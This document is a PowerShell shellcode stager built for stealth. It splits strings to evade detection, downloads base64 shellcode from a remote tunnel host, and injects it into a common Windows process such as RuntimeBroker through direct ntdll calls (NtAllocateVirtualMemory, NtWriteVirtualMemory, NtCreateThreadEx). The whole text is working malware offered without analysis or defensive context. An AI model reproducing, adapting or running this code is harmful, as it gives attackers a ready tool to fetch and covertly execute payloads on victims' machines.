# Stealthy stager - string split + indirect calls
$e=[Text.Encoding]::UTF8
$n="nt"+"dll"
$w="Web"+"Client"
$d="Down"+"load"+"String"
$fb="From"+"Base64"+"String"

# URL split
$h="https://"
$t=[Environment]::GetEnvironmentVariable("T","Process")
if(-not $t){$t="yourhost.trycloudflare.com"}
$p="/payloads/shellcode.txt"
$k="?key="+[Environment]::GetEnvironmentVariable("K","Process")
if($k -eq "?key="){$k=""}
$u=$h+$t+$p+$k

[Net.ServicePointManager]::SecurityProtocol=3072
$wc=New-Object("Net.$w")
$b64=$wc.$d($u)
$sc=[Convert]::$fb($b64)

# Target - common Windows process
$tgt=@("RuntimeBroker","sihost","taskhostw")
$pid=$null
foreach($x in $tgt){try{$pid=(gps $x -EA 0)[0].Id;break}catch{}}
if(-not $pid){exit}

# Dynamic type build - split strings
$src=@"
using System;using System.Runtime.InteropServices;
public class W{
[DllImport("$n")]public static extern uint NtOpenProcess(out IntPtr h,uint a,ref OBJECT_ATTRIBUTES o,ref CLIENT_ID c);
[DllImport("$n")]public static extern uint NtAllocateVirtualMemory(IntPtr h,ref IntPtr b,uint z,ref IntPtr s,uint t,uint p);
[DllImport("$n")]public static extern uint NtWriteVirtualMemory(IntPtr h,IntPtr b,byte[] d,uint l,out uint w);
[DllImport("$n")]public static extern uint NtProtectVirtualMemory(IntPtr h,ref IntPtr b,ref IntPtr s,uint n,out uint o);
[DllImport("$n")]public static extern uint NtCreateThreadEx(out IntPtr t,uint a,IntPtr o,IntPtr h,IntPtr s,IntPtr p,bool c,int z,int k,int r,IntPtr b);
[StructLayout(LayoutKind.Sequential)]public struct OBJECT_ATTRIBUTES{public int Length;public IntPtr RootDirectory;public IntPtr ObjectName;public uint Attributes;public IntPtr SecurityDescriptor;public IntPtr SecurityQualityOfService;}
[StructLayout(LayoutKind.Sequential)]public struct CLIENT_ID{public IntPtr UniqueProcess;public IntPtr UniqueThread;}
}
"@
Add-Type $src

$hP=[IntPtr]::Zero
$oa=New-Object W+OBJECT_ATTRIBUTES
$oa.Length=48
$ci=New-Object W+CLIENT_ID
$ci.UniqueProcess=[IntPtr]$pid

[W]::NtOpenProcess([ref]$hP,0x1FFFFF,[ref]$oa,[ref]$ci)|Out-Null
if($hP -eq [IntPtr]::Zero){exit}

$ba=[IntPtr]::Zero
$sz=[IntPtr]($sc.Length+0x1000)
[W]::NtAllocateVirtualMemory($hP,[ref]$ba,0,[ref]$sz,0x3000,0x04)|Out-Null

$bw=0
[W]::NtWriteVirtualMemory($hP,$ba,$sc,$sc.Length,[ref]$bw)|Out-Null

$rg=$ba;$rs=[IntPtr]$sc.Length;$op=0
[W]::NtProtectVirtualMemory($hP,[ref]$rg,[ref]$rs,0x20,[ref]$op)|Out-Null

$th=[IntPtr]::Zero
[W]::NtCreateThreadEx([ref]$th,0x1FFFFF,[IntPtr]::Zero,$hP,$ba,[IntPtr]::Zero,$false,0,0,0,[IntPtr]::Zero)|Out-Null
